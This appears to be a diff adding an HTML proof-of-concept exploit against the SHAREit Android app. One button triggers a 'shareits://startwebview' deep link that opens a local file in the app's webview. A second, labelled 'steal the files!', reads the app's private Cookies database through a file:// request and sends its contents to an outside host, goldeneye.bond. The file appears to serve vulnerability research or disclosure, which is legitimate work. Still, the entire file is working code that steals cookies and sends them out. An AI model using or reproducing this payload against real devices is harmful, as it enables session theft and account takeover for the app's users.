@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+
+
+        <button id="myButton" class="float-left submit-button" >Load url!</button>
+
+
+
+
+<button onclick="download()">
+    steal the files!
+</button>
+
+
+
+
+
+
+    </body>
+
+
+    <script type="text/javascript">
+        document.getElementById("myButton").onclick = function () {
+            location.href = "shareits://startwebview/7?title=alooodo&&msg=ddd&image=aaeaaaaaaa&business-type=aaaaaa&webpage=aadaa&url=file:///storage/emulated/0/Download/nothin223.html&is_hybrid=true&is_remotes=false&new_task=true";
+        };
+    </script>
+    <script type="text/javascript">
+        function download() {
+
+
+
+
+function theftFile(path, callback) {
+  var req = new XMLHttpRequest();
+
+
+  req.open("POST", "file://" + path, true);
+  req.onload = function(e) {
+    callback(req.responseText);
+  }
+  req.onerror = function(e) {
+    callback(null);
+  }
+  req.send();
+}
+
+
+var file = "/data/data/com.lenovo.anyshare.gps/app_webview/Default/Cookies";
+
+
+theftFile(file, function(contents) {
+    location.href = "https://www.goldeneye.bond/?data=" + encodeURIComponent(contents);
+});
+}
+</script>
+</html>
